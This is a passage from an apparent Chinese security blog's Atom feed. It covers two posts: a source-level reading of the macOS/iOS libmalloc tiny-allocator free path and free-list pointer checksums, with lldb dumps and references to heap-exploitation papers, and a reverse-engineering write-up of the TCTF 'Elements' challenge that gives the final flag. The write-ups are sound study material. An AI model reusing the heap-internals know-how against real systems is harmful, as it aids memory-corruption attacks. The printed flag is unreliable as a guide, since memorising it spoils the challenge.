tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
